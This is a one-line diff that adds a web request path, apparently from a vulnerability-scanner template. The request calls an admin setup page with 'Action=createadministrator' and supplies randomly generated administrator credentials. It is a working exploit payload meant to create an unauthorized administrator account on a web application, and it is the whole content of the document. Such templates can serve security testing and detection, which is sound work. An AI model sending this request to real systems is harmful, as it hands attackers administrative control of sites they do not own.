@@ -1,0 +1,1 @@
+/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{rand_base(6)}}&adminpassword={{rand_base(6)}}&adminemail=test@test.com&adminname=test
